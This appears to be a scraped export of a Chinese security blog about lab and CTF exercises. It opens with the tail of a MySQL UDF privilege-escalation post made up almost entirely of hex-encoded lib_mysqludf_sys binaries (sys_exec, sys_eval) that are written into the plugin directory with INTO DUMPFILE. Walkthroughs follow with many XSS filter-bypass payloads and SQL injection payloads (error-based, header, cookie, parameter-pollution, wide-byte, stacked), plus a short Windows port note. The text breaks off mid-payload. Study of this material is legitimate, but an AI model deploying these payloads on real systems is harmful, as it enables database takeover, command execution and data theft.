088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000 INTO DUMPFILE /usr/lib/mysql/plugin/udf.so; lib_mysqludf_sys_64.so SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE /usr/lib/mysql/plugin/udf.so;","tags":["MySQL","提权","UDF"],"categories":["MySQL","提权"]},{"title":"解决Windows端口占用问题","path":"/2025/07/29/解决Windows端口占用问题/","content":"解决Windows端口占用问题 我在搭建靶场时发现总有些端口被占用，作为一名计算机小白，这让我苦恼万分，于是我上网查找解决方法，下面的方法是亲测有效的 以解决8700端口为例： 使用命令查看8700端口被哪个进程占用 netstat -ano | findstr 8700 我们看到28076这个进程被监听了，我们可以看一下线程具体任务 tasklist | findstr 28076 我们看到是被httpd程序占用，可以直接去任务管理器强制关闭，但是我们通常跳过这一步直接执行下面的命令 taskkill /pid 28076 /f 因此关闭端口实际上只需要2步：查找端口对应的pid——杀死该pid","tags":["Windows"],"categories":["Windows"]},{"title":"xss-labs","path":"/2025/07/28/xss-labs/","content":"xss-labs level2 先用基础payload： scriptalert(1)/script 查看网页源码： 说明服务端对用户输入做了转义（ 变成了 lt） 查看题目源代码： 发现 htmlspecialchars($str) 能将一些特殊的 HTML 字符转换为 HTML 实体 字符 转换为 amp; lt; gt; quot; ' #039; （当 ENT_QUOTES 被设置时） nbsp; 我们可以直接闭合input标签进行绕过 scriptalert(1)/script level3 还是先用： scriptalert(1)/script 查看网页源代码： 发现表单内的和h2标签的都被转义了 查看源代码： echo h2 align=center没有找到和.htmlspecialchars($str).相关的结果./h2.centerform action=level3.php method=GETinput name=keyword value=.htmlspecialchars($str). input type=submit name=submit value=搜索 / 单引号虽然存在实体apos但是不被转义（未设置ENT_QUOTES），HTML5中预留但是也不推荐使用 先闭合value，再引入鼠标事件的属性(最常与 input、select 和 a 标签一起使用)： onclick onfocus onmouseover onmouseout 再闭合javascript伪协议来执行 onclick=javascript:alert(1) //点击input标签时 onfocus=javascript:alert(1) //聚焦input标签时 onmouseover=javascript:alert(1) //进入input标签时 onmouseout=javascript:alert(1) //移出input标签时 总结：onfocus可以绕过html实体化(即号的过滤) level5 依旧scriptalert(1)/script开局，script变成scr_ipt，再试试鼠标事件，on变成o_n 源代码： 过滤了js的标签还有onfocus事件，虽然str_replace不区分大小写，但是有小写字母转化函数，所以就不能用大小写法来绕过过滤了，只能新找一个方法进行xss注入 这里可以使用a标签的href属性 payload： a href=javascript:alert(1)1/a 点击链接就可以了 level6 这题替换的关键字比上题多，但是没有添加小写转化函数，我们可以采用大小写绕过 level7 不难发现，这里面进行了小写转化，将检测出来的on，script，href，src和data给删掉了，但是我们可以利用双写来绕过 比如下面这个payload： scriscriptptalert(1)/scriscriptpt level8 是把传入的字符串进行转小写之后进行一系列过滤操作，最后将字符写入a标签的href属性中，跳转链接 我们能利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议 javascript:alert() 利用在线工具进行Unicode编码后得到 #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#41; 总结： href属性自动解析Unicode编码 level9 下面多了个strpos()函数的验证，输入字符串必须包含http:// payload1： 将http://用注释符注释掉否则会执行不了无法弹窗 #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#41;/* http:// */ payload2： 将http://写在alert内 #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;:alert(http://) 总结：插入指定内容（本关是http://）绕过检测 level10 这里有隐藏的传参方法，如果没有后端代码，就查看页面源代码一个一个测，这里是get传参t_sort，并过滤掉了号，不能闭合插入标签，但是我们还能用onfocus事件，因为这里输入框被隐藏了，需要添加type=text，构造payload： ?t_sort= onfocus=javascript:alert() type=text 这里input标签内将会出现两个type属性，浏览器通常会判定第一个出现的值作为最终的值 level11 先看参数t_sort，想通过覆盖type属性的值就要闭合双引号，就会被转义，是行不通的，那就通过t_ref参数，修改ref头来进行xss level15 其中： span class=ng-include:.htmlspecialchars($str). ng-include类似于php的文件包含 ng-include 指令用于包含外部的 HTML文件，包含的内容将作为指定元素的子节点，ng-include 属性的值可以是一个表达式，返回一个文件名，默认情况下，包含的文件需要包含在同一个域名下 特别值得注意的几点如下： ng-include,如果单纯指定地址，必须要加引号 ng-include,加载外部html，script标签中的内容不执行 ng-include,加载外部html中含有style标签样式可以识别 ng-inclue,记载外部html中的link标签可以加载 我们先试试看包涵第一关，构建payload： ?src=/level1.php 注意，这里不能包涵那些直接弹窗的东西如script，但是可以包涵那些标签的东西比如a、input、img、p标签等等，这些标签是能需要我们手动点击弹窗的 ?src=level1.php?name=a href=javascript:alert(1)xss/a//错误的，自己看着点单双引号?src=level1.php?name=a href=javascript:alert(/xss/)//正确的?src=level1.php?name=img src=1 onerror=alert(1)///错误的，不要加/?src=level1.php?name=img src=1 onerror=alert(1)//正确的 总结：ng-include文件包涵，可以无视html实体化 level16 将script、 、/转化为空格的html实体化形式，可以用回车的URL编码%0a代替空格绕过，再配合上不用/的img、svg等标签 payload： ?keyword=img%0asrc=1%0aonerror=alert(1) 参考： XSS-potatowo xss-labs靶场实战全通关详细过程（xss靶场详解）","tags":["漏洞","XSS","CTF","靶场"],"categories":["CTF","靶场"]},{"title":"sqli-labs","path":"/2025/07/28/sqli-labs/","content":"sqli-labs Less-17 基于报错注入的加强版 测试注入点时发现无论如何都没反应，只出现上图情况，当用户名为‘ admin ’或‘ Dumb ’时任意密码登录 发现密码会被更新 既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合 发现确实为'闭合 用报错注入查库，查表，查列，查数据 但是当要查表时出现下述问题 payload： 1and updatexml(1, concat(0x7e, (select group_concat(username,id,password) from users)),1) # 查了一下才知道mysql修改和查询不能是同一张表 所以我们可以引入一个临时表 payload： 1and updatexml(1, concat(0x7e, (select group_concat(username,id,password) from (select username,id,password from users) as ikun limit 0,1)),1) # 但是当我们用limit 1,1时，出现了问题，后来才意识到group_concat是将数据放到一行输出，不能与limit结合查询（只能查一行/部分） 我们进而用mid payload： 1and updatexml(1, concat(0x7e, mid((select group_concat(username,id,password) from (select username,id,password from users) as ikun ),1,21)),1)# 也可以用concat_ws代替group_concat payload: 1 and updatexml(1,concat(0x7e,(select concat_ws(:,username,id,password) from (select username,id,password from users) as ikun limit 1,1)),1)# Less18 基于user-agent的http头注入 用admin登录看到user-agent的内容回显在页面中 先尝试用',出现报错信息，其包含ip和用户名（当然也有user-agent） 猜想在数据中的sql语句为：INSEERT INTO table VALUES('User-Agent','Ip','Username') (当然我也是看了后端代码才知道的，因为缺乏经验哈哈哈) 用')闭合 加个#，报错信息消失，说明为')闭合 接下来我们尝试在User-Agent的位置进行注入测试，我们修改User-Agnet的值使其符合整个INSERT INTIO 的语法 构造1',1,1)#形式进行报错注入 payload1： 1,1,extractvalue(0x0a,concat(0x0a,(select database()))))# 也可以构造'and ...and '# payload2: and extractvalue(0x0a,concat(0x0a,(select database()))) and # 解释一下上述paylaod 插入语句中变成： and extractvalue(...) and # 这是一个合法的布尔表达式，MySQL会自动将它的最终值转换为·字符串插入到表中 ''=true extractvalue(...) 返回字符串（我们在乎的是它会抛出错误） ’#'=true（#不是起注释作用） 最终变成： INSERT INTO table VALUES(表达式结果, Ip, Username); Less20 基于Cookie的http头注入 用admin登录后出现以下界面 Cookie：uname=admin Cookie这里存在注入点 尝试用'进行闭合，出现语法报错，加#后页面正常，说明闭合方式为',看到页面有3个可能的回显点，我先尝试一下联合查询注入 先判断出有3列 再找出回显位 最后用正常方法即可得到数据 Less23 注释符全被过滤掉了 单引号闭合时报错 加上注释符时报错未消失 猜测注释符可能被过滤掉了（尝试编码绕过也不行） 过滤了注释符并不能影响我们的注入，可以使用两个单引号分别闭合两侧的 Sql 查询语句，同时需要使用 OR 运算符分割并构造恒真语句 payload： ?id=1 or 1=1 成功力！ 这样就可以开始查询数据库了 payload： ?id=1and updatexml(1,concat(1,(select database())),1) or 1=1# 或者用and 闭合后面的引号也行(这里是报错注入所以就不用太在意and、or逻辑关系)?id=1 and extractvalue(1,concat(1,(select database()))) and Less26 过滤了and、or、空格、注释符 and、or可以通过双写绕过，注释符过滤绕过可以通过闭合后引号解决 测试闭合方式（请教了土豆学长才知道） 先用 1anandd1=1 再用 1anandd1=2 若网页回显不同说明是单引号闭合 空格过滤我尝试了url编码、/**/绕过发现行不通 去网上捣鼓一番，收获颇丰！ 如果空格被过滤可以使用以下字符替代 %09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)，%0c(换页符)，%20(空格)，/**/(内联注释) 我发现还可以用()进行绕过 payload： ?id=1anandd(extractvalue(1,concat(1,(select(database())))))oorr1=1 还有个神仙做法： 用使用 “||” 替代 “or” payload： ?id=1||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1))||1=1 Less27a 过滤了select、union、空格、注释符 双引号闭合 没有语法报错，不能用报错注入，我们选择联合查询注入 由于-被过滤，我们选一个较大的数 接下去正常绕过查询 Less29 单引号闭合，http参数污染 这里应该是我的靶场出了点问题，竟然没过滤（都是Protected By The World’s Best Firewall，但是可以正常查询） 去看了题目的源码，发现还有login.php和hacked.php代码 只能手动进入login.php 测试了下单引号双引号闭合，都跳转到hacked.php 看了下login.php： WAF白名单函数whitelist($input) //WAF implimentation with a whitelist approach..... only allows input to be Numeric.function whitelist($input) $match = preg_match(/^\\d+$/, $input); if($match) //echo you are good; //return $match; else header(Location: hacked.php); //echo you are bad; 其中： $match = preg_match(/^\\d+$/, $input); /^\\d+$/ 的含义： ^：字符串开头 \\d+：至少一个数字 $：字符串结尾 整个正则要求 输入必须是全数字组成 header(Location: hacked.php) 重定向到hacked.php HTTP 参数污染（HPP） 行为模拟 java_implimentation($query_string) // The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).function java_implimentation($query_string) $q_s = $query_string; $qs_array= explode(,$q_s); foreach($qs_array as $key = $value) $val=substr($value,0,2); if($val==id) $id_value=substr($value,3,30); return $id_value; echo br; break; 该方法将 GET 读入的整行参数使用 explode() 方法对 “” 进行分割，返回一个分割后的数组。接着方法通过 substr() 方法提取对 “” 分割后的第一个元素的前 2 个字符，若这 2 个字符是 “id”，则再次使用 substr() 方法提取等号后面的值返回。注意该方法提取的是 2 个同名变量中的第一个，因此它无法对第二个同名变量进行操作 结合网页给的pdf(这个我打不开，嫖了一下土豆哥的) 可以看到搭建在apache服务器上的php服务对于传入多个相同名字的参数，服务器只解析最后一个，由于注入 2 个同名参数时，java_implimentation() 方法返回的参数是第一个 id 参数，此时这个过滤就被我们绕过了，所以$_GET['id']变量实际上是最后一个id参数 总结： 1.全数字输入才能绕过WAF 2.我们可以通过注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入 payload： ?id=1id=-1union select 1,2,3--+ Less32 宽字节注入 输入'发现其被转义 查看源码： function check_addslashes($string) $string = preg_replace(/. preg_quote(\\\\) ./, \\\\\\\\\\\\, $string); //escape any backslash $string = preg_replace(/\\/i, \\\\\\, $string); //escape single quote with a backslash $string = preg_replace(/\\/, \\\\\\, $string); //escape double quote with a backsla return $string; 该函数使用正则表达式匹配字符，将 ' 转义为 \\' ， 将 \\ 转义为 \\\\ ，将 转义为 \\ 在Less36中采取： function check_quotes($string) $string = mysql_real_escape_string($string); return $string; 使用mysql_real_escape_string()函数来转义特殊字符 对于一般的转义字符，我们是无法构造注入的 payload 的，通常情况下不存在SQL注入，但这并不代表网页就没有任何漏洞可以注入 我们注意到数据库采用gbk编码： mysql_query(SET NAMES gbk);$sql=SELECT * FROM users WHERE id=$id LIMIT 0,1;$result=mysql_query($sql); 这里尝试采用宽字节注入： 数据库的编码采用 GBK 国标码时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了 输入%df'时成功返回错误信息，加--+页面正常，绕过成功 我们采用联合查询注入，但需要注意的是： 不要使用单引号来闭合字符串，改用十六进制 (HEX) 编码（网页有提示）替代所需数据库名、表名 如以下使用0x7365637572697479替代security Less38 单引号闭合，这题主要用来测试堆叠注入 在源码中发现： mysqli_multi_query($con1, $sql) 该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 mysql_query() 函数，只执行一条 MySQL 查询 插入新用户ikun： 查询id为999的用户： 堆叠注入： ?id=1;CREATE TABLE WhiteMoon LIKE users;--+?id=1;INSERT INTO WhiteMoon SELECT * FROM 